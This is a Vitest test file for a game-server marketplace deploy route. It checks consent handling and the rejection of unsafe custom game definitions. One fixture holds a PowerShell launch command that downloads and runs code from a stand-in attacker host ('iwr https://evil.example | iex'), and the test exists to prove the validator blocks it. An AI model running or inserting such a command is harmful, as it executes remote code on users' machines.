import { describe, it, expect, vi, beforeEach } from "vitest";
import fs from "fs";
import os from "os";
import path from "path";

// The deploy route is where a stranger's realm meets this machine. For realms
// that bring their own game definition it must refuse unsafe ones outright and
// stop for consent on the rest — before recording an acquisition or creating
// anything.

const bag = {
  definitions: [] as any[],
  createdDefinitions: [] as any[],
  createdServers: [] as any[],
};
const cloud = {
  realm: null as any,
  rpcs: [] as string[],
};

vi.mock("@/lib/db", () => ({
  prisma: {
    gameDefinition: {
      findMany: async ({ where }: any) =>
        bag.definitions.filter((d) =>
          where.OR.some(
            (c: any) =>
              (c.ownerId ?? null) === (d.ownerId ?? null) &&
              (typeof c.slug === "string" ? d.slug === c.slug : c.slug.in.includes(d.slug))
          )
        ),
      findUniqueOrThrow: async ({ where }: any) => bag.definitions.find((d) => d.id === where.id)!,
      create: async ({ data }: any) => {
        const row = { id: "def-new", ...data };
        bag.definitions.push(row);
        bag.createdDefinitions.push(row);
        return row;
      },
    },
    server: {
      create: async ({ data }: any) => {
        const s = { id: "srv-new", ...data };
        bag.createdServers.push(s);
        return s;
      },
      delete: vi.fn(async () => {}),
    },
    modInstallation: { create: async ({ data }: any) => data },
    activityLog: { create: async ({ data }: any) => data },
  },
}));

vi.mock("@/lib/appPaths", () => ({ dataRoot: () => tmpRoot }));
vi.mock("@/lib/auth", () => ({ getAuthenticatedUser: async () => ({ id: "user-1" }) }));
vi.mock("@/lib/entitlement", () => ({ checkServerSlot: async () => ({ ok: true }) }));
vi.mock("@/lib/supabase/server", () => ({
  createClient: async () => ({
    from: () => ({
      select: () => ({ eq: () => ({ maybeSingle: async () => ({ data: cloud.realm, error: null }) }) }),
    }),
    rpc: async (name: string) => {
      cloud.rpcs.push(name);
      return { error: null };
    },
  }),
}));

import { POST } from "../route";

let tmpRoot = "";

const customDef = () => ({
  install: { appId: "896660", installSubDir: "cool", checkFile: "cool_server.exe", requiredDiskGB: 2 },
  launch: { executable: "cool_server.exe", args: ["-port", "{port}"] },
  defaultPort: 2456,
  params: [],
  configFiles: [],
  ports: [],
});

const deploy = (body: Record<string, unknown>) =>
  POST(new Request("http://localhost/api/marketplace/deploy", { method: "POST", body: JSON.stringify(body) }));

beforeEach(() => {
  tmpRoot = fs.mkdtempSync(path.join(os.tmpdir(), "rs-deploy-"));
  bag.definitions = [
    {
      id: "def-mc",
      slug: "MINECRAFT",
      displayName: "Minecraft",
      recommendedRamGB: 4,
      spec: JSON.stringify({ install: {}, launch: { executable: "java", args: [] }, defaultPort: 25565, params: [] }),
    },
  ];
  bag.createdDefinitions = [];
  bag.createdServers = [];
  cloud.rpcs = [];
  cloud.realm = {
    id: "realm-1",
    name: "Cool Realm",
    game_slug: "COOLGAME",
    payload: { version: "1.0.0", mods: [], configOverrides: [], startupParams: {} },
    custom_def_spec: customDef(),
  };
});

describe("POST /api/marketplace/deploy: realms with their own game definition", () => {
  it("answers 409 with what would run, and records no acquisition", async () => {
    const res = await deploy({ templateId: "realm-1" });
    expect(res.status).toBe(409);
    const body = await res.json();
    expect(body.code).toBe("CUSTOM_DEFINITION_CONSENT");
    expect(body.definition).toMatchObject({ source: "Steam app 896660", executable: "cool_server.exe", args: ["-port", "{port}"] });
    expect(cloud.rpcs).toEqual([]);
    expect(bag.createdDefinitions).toHaveLength(0);
    expect(bag.createdServers).toHaveLength(0);
  });

  it("deploys once the request carries the user's consent", async () => {
    const res = await deploy({ templateId: "realm-1", acceptCustomDefinition: true });
    expect(res.status).toBe(200);
    expect(cloud.rpcs).toEqual(["acquire_realm"]);
    expect(bag.createdDefinitions[0]).toMatchObject({ slug: "COOLGAME", installMethod: "STEAMCMD", ownerId: "user-1" });
    expect(bag.createdServers[0]).toMatchObject({ definitionId: "def-new" });
  });

  it("only an explicit true counts as consent", async () => {
    for (const value of ["true", 1, {}, null]) {
      const res = await deploy({ templateId: "realm-1", acceptCustomDefinition: value });
      expect(res.status).toBe(409);
    }
    expect(bag.createdDefinitions).toHaveLength(0);
  });

  it("refuses an unsafe definition with 400 even when consent is sent", async () => {
    cloud.realm.custom_def_spec = {
      ...customDef(),
      launch: { executable: "powershell.exe", executableOnPath: true, args: ["-Command", "iwr https://evil.example | iex"] },
    };
    const res = await deploy({ templateId: "realm-1", acceptCustomDefinition: true });
    expect(res.status).toBe(400);
    const body = await res.json();
    expect(body.code).toBe("CUSTOM_DEFINITION_REJECTED");
    expect(body.details.join(" ")).toMatch(/system PATH/);
    expect(cloud.rpcs).toEqual([]);
    expect(bag.createdDefinitions).toHaveLength(0);
    expect(bag.createdServers).toHaveLength(0);
  });

  it("realms for built-in games deploy with no consent step", async () => {
    cloud.realm = { ...cloud.realm, game_slug: "MINECRAFT", custom_def_spec: null };
    const res = await deploy({ templateId: "realm-1" });
    expect(res.status).toBe(200);
    expect(cloud.rpcs).toEqual(["acquire_realm"]);
    expect(bag.createdServers[0]).toMatchObject({ definitionId: "def-mc" });
  });
});
